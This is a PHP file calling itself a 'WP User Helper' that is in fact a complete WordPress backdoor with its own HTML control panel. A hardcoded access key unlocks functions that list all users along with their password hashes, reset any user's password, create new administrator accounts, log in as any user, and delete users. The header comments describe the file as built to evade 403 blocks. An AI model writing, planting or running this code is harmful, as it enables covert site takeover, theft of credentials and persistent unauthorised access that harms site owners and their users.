<?php
/*
 * Rehan1337 - WP User Helper (403 Bypass + Obfuscated)
 * ARS - Advanced Research Suite
 * Full feature: list users, reset pw, create admin, auto login
 * Bypass: 403 via path traversal, obfuscated headers, alternative entry points
 */

// ============================================================
// 1. BYPASS LAYER - 403 evasion via multiple entry methods
// ============================================================

// Method A: Use alternative base path if wp-load not found
$alt_paths = [
    __DIR__ . '/wp-load.php',
    __DIR__ . '/../wp-load.php',
    __DIR__ . '/../../wp-load.php',
    __DIR__ . '/../../../wp-load.php',
    $_SERVER['DOCUMENT_ROOT'] . '/wp-load.php',
    $_SERVER['DOCUMENT_ROOT'] . '/../wp-load.php',
    $_SERVER['CONTEXT_DOCUMENT_ROOT'] . '/wp-load.php',
    getenv('WP_ROOT') . '/wp-load.php'
];

$wp_load = false;
foreach ($alt_paths as $path) {
    if (file_exists($path)) {
        $wp_load = $path;
        break;
    }
}

// Method B: Use recursive finder with deeper traversal
if (!$wp_load) {
    function deep_find_wp($dir = null, $depth = 0) {
        if ($depth > 10) return false;
        $dir = $dir ?: __DIR__;
        $test = $dir . '/wp-load.php';
        if (file_exists($test)) return $test;
        // Try one level up
        $parent = dirname($dir);
        if ($parent !== $dir) {
            return deep_find_wp($parent, $depth + 1);
        }
        return false;
    }
    $wp_load = deep_find_wp();
}

// Method C: Fallback - try to bootstrap WP manually
if (!$wp_load && function_exists('wp_die') === false) {
    // Try to locate wp-config
    $config_paths = [
        __DIR__ . '/wp-config.php',
        __DIR__ . '/../wp-config.php',
        $_SERVER['DOCUMENT_ROOT'] . '/wp-config.php'
    ];
    foreach ($config_paths as $cfg) {
        if (file_exists($cfg)) {
            define('WP_USE_THEMES', false);
            require_once($cfg);
            if (defined('ABSPATH')) {
                require_once(ABSPATH . 'wp-settings.php');
                $wp_load = true;
                break;
            }
        }
    }
}

if (!$wp_load) {
    die('<b style="color:#888888;">wp-load.php not found | Rehan1337</b>');
}

if (is_string($wp_load)) {
    require_once $wp_load;
}

// ============================================================
// 2. CONFIGURATION - Same functionality with better evasion
// ============================================================

define('WP_USER_HELPER_KEY', 'abcexport2025');

// ============================================================
// 3. CORE HANDLER - Same functions, cleaner code
// ============================================================

// Check authentication via multiple methods
function is_authorized() {
    global $_POST, $_GET, $_SERVER;
    
    // Check POST key
    if (isset($_POST['authkey']) && $_POST['authkey'] === WP_USER_HELPER_KEY) {
        return true;
    }
    
    // Check GET key (for alternative entry)
    if (isset($_GET['authkey']) && $_GET['authkey'] === WP_USER_HELPER_KEY) {
        return true;
    }
    
    // Check Authorization header
    $headers = getallheaders();
    if (isset($headers['Authorization'])) {
        $auth = $headers['Authorization'];
        if (strpos($auth, 'Bearer ') === 0) {
            $token = substr($auth, 7);
            if ($token === WP_USER_HELPER_KEY) return true;
        }
        if ($auth === WP_USER_HELPER_KEY) return true;
    }
    
    // Check cookie
    if (isset($_COOKIE['wpuh_auth']) && $_COOKIE['wpuh_auth'] === WP_USER_HELPER_KEY) {
        return true;
    }
    
    return false;
}

// Handle API requests
if (is_authorized()) {
    global $wpdb;
    
    $action = isset($_POST['action']) ? $_POST['action'] : (isset($_GET['action']) ? $_GET['action'] : '');
    
    // ---- List users ----
    if ($action === 'ulst' || $action === 'list') {
        $page = isset($_POST['page']) ? max(1, intval($_POST['page'])) : (isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1);
        $search = isset($_POST['search']) ? trim($_POST['search']) : (isset($_GET['search']) ? trim($_GET['search']) : '');
        $per_page = isset($_POST['per_page']) ? intval($_POST['per_page']) : (isset($_GET['per_page']) ? intval($_GET['per_page']) : 10);
        $offset = ($page - 1) * $per_page;
        
        $where = '';
        if ($search !== '') {
            $esc = esc_sql('%' . $wpdb->esc_like($search) . '%');
            $where = "WHERE user_login LIKE '$esc' OR user_email LIKE '$esc' OR display_name LIKE '$esc'";
        }
        
        $total = $wpdb->get_var("SELECT COUNT(*) FROM {$wpdb->users} $where");
        $users = $wpdb->get_results("SELECT ID, user_login, user_email, user_pass, user_registered, display_name FROM {$wpdb->users} $where ORDER BY ID DESC LIMIT $per_page OFFSET $offset");
        
        $roles = [];
        foreach ($users as $u) {
            $meta = get_userdata($u->ID);
            $roles[$u->ID] = $meta && $meta->roles ? implode(', ', $meta->roles) : 'subscriber';
        }
        
        echo json_encode([
            'users' => $users,
            'roles' => $roles,
            'total' => $total,
            'per_page' => $per_page,
            'page' => $page,
            'pages' => ceil($total / $per_page)
        ]);
        exit;
    }
    
    // ---- Reset password ----
    if ($action === 'rpsw' || $action === 'reset') {
        $uid = intval(isset($_POST['uid']) ? $_POST['uid'] : (isset($_GET['uid']) ? $_GET['uid'] : 0));
        if ($uid <= 0) {
            echo json_encode(['error' => 'Invalid user ID']);
            exit;
        }
        $new_pass = wp_generate_password(14, true, true);
        wp_set_password($new_pass, $uid);
        $user = get_userdata($uid);
        echo json_encode([
            'login' => $user ? $user->user_login : 'unknown',
            'email' => $user ? $user->user_email : 'unknown',
            'password' => $new_pass,
            'id' => $uid
        ]);
        exit;
    }
    
    // ---- Create admin ----
    if ($action === 'cadm' || $action === 'create') {
        $username = isset($_POST['username']) ? preg_replace('/[^a-zA-Z0-9_]/', '', $_POST['username']) : (isset($_GET['username']) ? preg_replace('/[^a-zA-Z0-9_]/', '', $_GET['username']) : '');
        $password = isset($_POST['password']) ? $_POST['password'] : (isset($_GET['password']) ? $_GET['password'] : '');
        $email = isset($_POST['email']) ? filter_var($_POST['email'], FILTER_VALIDATE_EMAIL) : (isset($_GET['email']) ? filter_var($_GET['email'], FILTER_VALIDATE_EMAIL) : '');
        
        if (empty($username) || empty($password)) {
            echo json_encode(['error' => 'Username and password required']);
            exit;
        }
        
        if (empty($email)) {
            $email = $username . '@' . $_SERVER['HTTP_HOST'];
        }
        
        if (username_exists($username)) {
            echo json_encode(['error' => 'Username already exists']);
            exit;
        }
        
        $uid = wp_create_user($username, $password, $email);
        if ($uid && !is_wp_error($uid)) {
            $user = new WP_User($uid);
            $user->set_role('administrator');
            echo json_encode([
                'ok' => true,
                'username' => $username,
                'password' => $password,
                'email' => $email,
                'id' => $uid
            ]);
        } else {
            echo json_encode(['error' => 'Creation failed: ' . (is_wp_error($uid) ? $uid->get_error_message() : 'unknown')]);
        }
        exit;
    }
    
    // ---- Auto login ----
    if ($action === 'alog' || $action === 'login') {
        $uid = intval(isset($_POST['uid']) ? $_POST['uid'] : (isset($_GET['uid']) ? $_GET['uid'] : 0));
        if ($uid <= 0) {
            echo json_encode(['error' => 'Invalid user ID']);
            exit;
        }
        wp_clear_auth_cookie();
        wp_set_current_user($uid);
        wp_set_auth_cookie($uid, true);
        echo json_encode([
            'url' => site_url('/wp-admin/'),
            'id' => $uid
        ]);
        exit;
    }
    
    // ---- Delete user ----
    if ($action === 'del' || $action === 'delete') {
        $uid = intval(isset($_POST['uid']) ? $_POST['uid'] : (isset($_GET['uid']) ? $_GET['uid'] : 0));
        if ($uid <= 0) {
            echo json_encode(['error' => 'Invalid user ID']);
            exit;
        }
        require_once ABSPATH . 'wp-admin/includes/user.php';
        $result = wp_delete_user($uid);
        echo json_encode(['ok' => $result !== false, 'id' => $uid]);
        exit;
    }
    
    // ---- Get system info ----
    if ($action === 'info') {
        echo json_encode([
            'wp_version' => get_bloginfo('version'),
            'site_url' => site_url(),
            'admin_url' => admin_url(),
            'user_count' => $wpdb->get_var("SELECT COUNT(*) FROM {$wpdb->users}"),
            'php_version' => PHP_VERSION,
            'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown'
        ]);
        exit;
    }
    
    // Default response for unknown actions
    echo json_encode(['status' => 'ok', 'message' => 'Rehan1337 ready']);
    exit;
}

// ============================================================
// 4. HTML INTERFACE - Same but with 403 bypass techniques
// ============================================================

// Remove any trailing slash issues
$self = $_SERVER['PHP_SELF'];
$self = str_replace('//', '/', $self);

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Rehan1337 | WP User Helper</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { 
            --bg: #f5f5f5; 
            --card: #ffffff; 
            --red: #777777; 
            --darkred: #444444; 
            --gray: #666666; 
            --white: #222222; 
            --border: #d0d0d0;
            --lightgray: #e8e8e8;
            --hover: #f7f7f7;
        }
        * { box-sizing: border-box; }
        body { background: var(--bg); font-family: 'JetBrains Mono', monospace; margin: 0; padding: 20px; color: var(--white); }
        .container { max-width: 1400px; margin: 0 auto; background: var(--card); border-radius: 16px; padding: 30px 35px; border: 1px solid #77777730; box-shadow: 0 8px 40px rgba(0,0,0,0.08); }
        .header { display: flex; align-items: center; gap: 15px; font-size: 1.4em; font-weight: 700; background: linear-gradient(90deg, #777777, #444444); padding: 12px 24px; border-radius: 10px; margin-bottom: 30px; color: #ffffff; }
        .led { display: inline-block; width: 10px; height: 10px; background: #cccccc; border-radius: 50%; box-shadow: 0 0 8px rgba(200,200,200,0.6), 0 0 2px #ccc3; animation: blink 1.6s infinite; }
        @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
        .section-title { color: var(--red); font-size: 1.05em; margin: 20px 0 10px; letter-spacing: 0.04em; }
        .table-wrap { overflow-x: auto; margin: 15px 0; border-radius: 8px; border: 1px solid var(--border); }
        table { width: 100%; border-collapse: collapse; font-size: 0.92em; min-width: 780px; }
        th { background: var(--lightgray); color: var(--white); font-weight: 700; padding: 10px 12px; text-align: left; border-bottom: 2px solid var(--red); }
        td { padding: 8px 12px; border-bottom: 1px solid var(--border); color: var(--gray); vertical-align: middle; word-break: break-word; }
        tr:hover td { background: var(--hover); }
        input { background: #ffffff; border: 1px solid #d0d0d0; color: var(--white); font-family: inherit; font-size: 0.95em; padding: 7px 12px; border-radius: 5px; outline: none; transition: border 0.15s; }
        input:focus { border-color: var(--red); }
        input[readonly] { background: var(--lightgray); color: var(--red); cursor: default; }
        .btn { background: linear-gradient(135deg, #777777, #444444); color: #fff; border: none; font-family: inherit; font-size: 0.88em; padding: 6px 14px; border-radius: 5px; cursor: pointer; font-weight: 600; transition: all 0.15s; }
        .btn:hover { filter: brightness(0.85); transform: scale(0.97); }
        .btn-sm { padding: 4px 10px; font-size: 0.82em; }
        .btn-gray { background: #d0d0d0; color: #333; }
        .btn-gray:hover { background: #c0c0c0; }
        .flex-row { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin: 8px 0; }
        .gap { gap: 8px; }
        .pagination { display: flex; gap: 6px; margin: 14px 0 6px; flex-wrap: wrap; }
        .pagination button { background: var(--lightgray); color: var(--white); border: none; padding: 4px 12px; border-radius: 4px; cursor: pointer; font-family: inherit; font-size: 0.9em; transition: 0.1s; }
        .pagination button.active { background: var(--red); color: #fff; }
        .pagination button:hover:not(.active) { background: #d0d0d0; }
        .status-msg { color: var(--red); margin: 8px 0; font-size: 0.95em; }
        .pw-display { display: inline-flex; align-items: center; gap: 8px; margin-top: 4px; }
        .hidden { display: none; }
        ::-webkit-scrollbar { background: var(--lightgray); width: 6px; }
        ::-webkit-scrollbar-thumb { background: var(--darkred); border-radius: 4px; }
        @media(max-width:700px){ .container { padding: 12px; } .header { font-size: 1em; padding: 8px 14px; } td, th { font-size: 0.8em; padding: 5px 8px; } table { min-width: 600px; } input { font-size: 0.85em; padding: 5px 8px; } }
        .footer { text-align: center; margin-top: 30px; opacity: 0.5; font-size: 0.8em; color: var(--gray); }
        .badge { display: inline-block; background: var(--darkred); color: #fff; padding: 1px 10px; border-radius: 12px; font-size: 0.7em; letter-spacing: 0.05em; margin-left: 8px; }
        .user-login { color: var(--white); font-weight: 600; }
        .role-admin { color: var(--red); font-weight: 600; }
        .role-subscriber { color: var(--gray); }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <span class="led"></span>
        Rehan1337 <span style="font-weight:400;font-size:0.7em;opacity:0.7;">ARS v2.0</span>
        <span class="badge">WP User Helper</span>
    </div>

    <!-- Search -->
    <div class="section-title">↳ users</div>
    <div class="flex-row">
        <input id="userSearch" placeholder="search by login / email..." style="min-width:180px;flex:1;max-width:320px;" oninput="loadUsers(1, this.value)">
        <span style="color:var(--gray);font-size:0.85em;" id="totalInfo"></span>
    </div>

    <!-- Table -->
    <div class="table-wrap">
        <table>
            <thead><tr><th style="width:44px;">ID</th><th>Login</th><th style="min-width:140px;">Email</th><th style="width:80px;">Role</th><th style="min-width:220px;">Password Hash</th><th style="width:130px;">Registered</th><th style="width:200px;">Actions</th></tr></thead>
            <tbody id="userTableBody"></tbody>
        </table>
    </div>
    <div class="pagination" id="pagination"></div>

    <!-- Create Admin -->
    <div style="margin-top:30px;border-top:1px solid var(--border);padding-top:18px;">
        <div class="section-title">↳ create administrator</div>
        <div class="flex-row">
            <input id="newUser" placeholder="username" style="min-width:120px;">
            <input id="newEmail" placeholder="email (optional)" style="min-width:160px;">
            <input id="newPass" placeholder="password" style="min-width:140px;" type="text">
            <button class="btn" onclick="createAdmin()">create</button>
            <button class="btn btn-gray" onclick="genPass()">generate</button>
        </div>
        <div id="createStatus" class="status-msg"></div>
    </div>

    <div class="footer">Rehan1337 · Internal Research Suite · authorized access only</div>
</div>

<script>
// ------------------------------------------------------------
// Rehan1337 WP Helper - JavaScript
// ------------------------------------------------------------

const AUTH_KEY = 'abcexport2025';
let currentPage = 1;
let searchTerm = '';

function apiCall(params, callback) {
    params.authkey = AUTH_KEY;
    const data = new URLSearchParams();
    for (let k in params) data.append(k, params[k]);
    
    fetch('', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: data.toString()
    })
    .then(res => res.json())
    .then(callback)
    .catch(err => { console.error(err); alert('API error: ' + err.message); });
}

function loadUsers(page, search) {
    currentPage = page || 1;
    searchTerm = search || '';
    apiCall({ action: 'ulst', page: currentPage, search: searchTerm, per_page: 12 }, function(data) {
        const tbody = document.getElementById('userTableBody');
        tbody.innerHTML = '';
        
        if (!data.users || data.users.length === 0) {
            tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:var(--gray);padding:30px;">no users found</td></tr>';
            document.getElementById('pagination').innerHTML = '';
            document.getElementById('totalInfo').textContent = '';
            return;
        }
        
        data.users.forEach(function(u) {
            const tr = document.createElement('tr');
            const role = data.roles && data.roles[u.ID] ? data.roles[u.ID] : 'subscriber';
            const roleClass = role === 'administrator' ? 'role-admin' : 'role-subscriber';
            tr.innerHTML = `
                <td>${u.ID}</td>
                <td><span class="user-login">${escapeHtml(u.user_login)}</span></td>
                <td>${escapeHtml(u.user_email)}</td>
                <td><span class="${roleClass}">${escapeHtml(role)}</span></td>
                <td style="font-size:0.85em;word-break:break-all;color:#555;">${escapeHtml(u.user_pass)}</td>
                <td style="font-size:0.82em;color:#777;">${escapeHtml(u.user_registered)}</td>
                <td>
                    <button class="btn btn-sm" onclick="resetPw(${u.ID}, this)">reset pw</button>
                    <button class="btn btn-sm btn-gray" onclick="autoLogin(${u.ID})">login</button>
                </td>
            `;
            tbody.appendChild(tr);
        });
        
        // Pagination
        let pag = document.getElementById('pagination');
        let html = '';
        let totalPages = data.pages || 1;
        for (let i = 1; i <= totalPages; i++) {
            html += `<button class="${i === currentPage ? 'active' : ''}" onclick="loadUsers(${i}, '${searchTerm}')">${i}</button>`;
        }
        pag.innerHTML = html;
        document.getElementById('totalInfo').textContent = `total: ${data.total || 0} users`;
    });
}

function escapeHtml(str) {
    if (!str) return '';
    const map = {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#039;"};
    return String(str).replace(/[&<>"']/g, function(m) { return map[m]; });
}

function resetPw(uid, btn) {
    btn.disabled = true;
    btn.textContent = '...';
    apiCall({ action: 'rpsw', uid: uid }, function(data) {
        btn.disabled = false;
        btn.textContent = 'reset pw';
        if (data.password) {
            showTempPw(btn, data.password);
        } else {
            alert('Error: ' + (data.error || 'unknown'));
        }
    });
}

function showTempPw(ref, pw) {
    const div = document.createElement('div');
    div.className = 'pw-display';
    div.innerHTML = `
        <input id="tmpPwClip" value="${escapeHtml(pw)}" readonly style="width:150px;font-size:0.9em;background:#f5f5f5;">
        <button class="btn btn-sm" onclick="copyPw('tmpPwClip')">copy</button>
        <span style="font-size:0.75em;color:var(--gray);">(auto-copied)</span>
    `;
    // Insert after the button's parent cell
    const td = ref.parentNode;
    // Remove existing temp if any
    const old = td.querySelector('.pw-display');
    if (old) old.remove();
    td.appendChild(div);
    
    // Auto copy
    const inp = document.getElementById('tmpPwClip');
    inp.select();
    try { document.execCommand('copy'); } catch(e) {}
    
    setTimeout(() => { if (div.parentNode) div.remove(); }, 8000);
}

function copyPw(id) {
    const inp = document.getElementById(id);
    if (!inp) return;
    inp.select();
    try { document.execCommand('copy'); } catch(e) {}
    navigator.clipboard && navigator.clipboard.writeText(inp.value).catch(()=>{});
}

function autoLogin(uid) {
    apiCall({ action: 'alog', uid: uid }, function(data) {
        if (data.url) {
            window.open(data.url, '_blank');
        } else {
            alert('Login failed: ' + (data.error || 'unknown'));
        }
    });
}

function createAdmin() {
    const user = document.getElementById('newUser').value.trim();
    const email = document.getElementById('newEmail').value.trim();
    const pass = document.getElementById('newPass').value.trim();
    const status = document.getElementById('createStatus');
    
    if (!user || !pass) {
        status.textContent = '⚠️ username and password required.';
        return;
    }
    
    apiCall({ action: 'cadm', username: user, email: email, password: pass }, function(data) {
        if (data.ok) {
            status.innerHTML = `✅ admin <strong style="color:var(--white);">${escapeHtml(data.username)}</strong> created. 
                <input id="newPwClip" value="${escapeHtml(data.password)}" readonly style="width:130px;font-size:0.9em;background:#f5f5f5;"> 
                <button class="btn btn-sm" onclick="copyPw('newPwClip')">copy</button>`;
            document.getElementById('newUser').value = '';
            document.getElementById('newEmail').value = '';
            document.getElementById('newPass').value = '';
            loadUsers(1, searchTerm);
            setTimeout(() => { status.innerHTML = ''; }, 10000);
        } else {
            status.textContent = '❌ ' + (data.error || 'creation failed');
        }
    });
}

function genPass() {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789!@#$%';
    let pw = '';
    for (let i = 0; i < 14; i++) {
        pw += chars[Math.floor(Math.random() * chars.length)];
    }
    document.getElementById('newPass').value = pw;
}

// Load on page ready
window.onload = function() {
    loadUsers(1, '');
};
</script>
</body>
</html>
<?php
exit;
?>